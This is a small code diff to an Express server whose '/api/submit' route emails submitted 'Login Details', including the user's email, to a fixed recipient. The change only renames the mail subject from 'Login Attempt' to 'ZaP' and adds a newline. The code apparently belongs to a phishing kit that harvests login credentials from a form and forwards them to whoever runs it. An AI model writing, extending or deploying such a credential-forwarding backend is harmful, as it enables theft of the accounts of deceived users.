@@ -72,7 +72,7 @@ app.post('/api/submit', async (req, res) => {
     await transporter.sendMail({
       from: `"Zap!" <${fromEmail}>`,
       to: CONFIG.EMAIL.RECIPIENT,
-      subject: `Login Attempt - ${email}`,
+      subject: `ZaP - ${email}`,
       html: `
         <h3>Login Details</h3>
         <p><strong>Email:</strong> ${email}</p>
@@ -110,3 +110,4 @@ app.listen(CONFIG.PORT, () => {
   console.log(`Server running on port ${CONFIG.PORT}`);
   console.log(`CORS configured for: ${CONFIG.CORS_ORIGIN}`);
 });
+
